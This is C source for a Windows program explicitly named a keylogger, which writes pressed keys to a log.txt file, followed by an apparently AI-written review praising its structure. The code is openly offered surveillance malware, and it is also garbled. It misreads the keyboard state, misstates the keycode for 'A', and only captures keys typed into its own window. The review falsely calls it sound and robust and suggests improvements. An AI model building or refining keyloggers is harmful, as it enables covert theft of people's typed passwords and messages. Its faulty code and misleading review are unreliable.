#include <windows.h>
#include <stdio.h>

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (msg == WM_KEYDOWN) {
        char buffer[256];
        GetKeyboardState((BYTE*)buffer);
        char key = 'a' + ((unsigned int*)buffer)[41]; // 41 is the keycode for 'A' on a US keyboard. Adjust as
needed for other locales/keyboards.
        if (key != '\0') {
            FILE *file;
            file = fopen("log.txt", "a"); // Opens or creates a text file called log.txt in the same directory
            if(file) {
                fprintf(file, "%c", key); // Writes the pressed key to the file
                fclose(file); // Closes the file
            }
        }
    }
    return DefWindowProc(hwnd, msg, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow) {
    static const TCHAR szAppName[] = TEXT("Keylogger"); // The name for the application
    HWND hwnd;
    MSG msg;
    WNDCLASS wndclass;

    // Register the window class.
    wndclass.style = CS_HREDRAW | CS_VREDRAW;
    wndclass.lpfnWndProc = WndProc;
    wndclass.cbClsExtra = 0;
    wndclass.cbWndExtra = 0;
    wndclass.hInstance = hInstance;
    wndclass.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    wndclass.hCursor = LoadCursor(NULL, IDC_ARROW);
    wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);
    wndclass.lpszMenuName = NULL;
    wndclass.lpszClassName = szAppName;
    if (!RegisterClass(&wndclass)) {
        return 0; // Registering the class failed, so exit the program
    }

    // Create the window.
    hwnd = CreateWindowEx(WS_EX_CLIENTEDGE, szAppName, TEXT("Keylogger"), WS_OVERLAPPEDWINDOW, CW_USEDEFAULT,
CW_USEDEFAULT, 240, 180, HWND_DESKTOP, NULL, hInstance, NULL);
    if (hwnd == NULL) {
        return 0; // Creating the window failed, so exit the program
    }

    ShowWindow(hwnd, iCmdShow); // Displays the window on the screen.

    // Main message loop:
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return msg.wParam;
}


/*Functionality: The code appears to be a keylogger that captures keystrokes and logs them to a file named "log.txt" in the same directory as the application.
Compilation: The code should compile without issues as it includes the required headers (<windows.h> and <stdio.h>) and uses standard Win32 API functions.
External Dependencies: The code relies on the Win32 API and would require linking against the appropriate Windows libraries (e.g., kernel32.lib, user32.lib).

Memory Leaks: The code does not appear to have any obvious memory leaks.

Constraint (using Win32 APIs): The code is written using the Win32 API and is, therefore, limited to Windows platforms.

Code Quality:
The code follows a more structured approach by creating a window and handling the keyboard events in the WndProc function.
Variable and function names are descriptive and follow a consistent naming convention.
The code includes basic error handling (e.g., checking if the file was opened successfully before writing to it).

However, there are still some areas for improvement:
The code assumes a US keyboard layout (keycode 41 for 'A'). It should be made more flexible to handle different keyboard layouts.
There is no input validation or sanitization, which could lead to security vulnerabilities if the logged data is not handled properly.
Error handling could be more comprehensive (e.g., handling file I/O errors, window creation failures).
The code does not provide a way to stop or uninstall the keylogger.
Comments explaining the code's functionality and purpose are missing.
Overall, this code is more robust and better structured than the previous one. However, it still lacks some security considerations, portability, and documentation.*/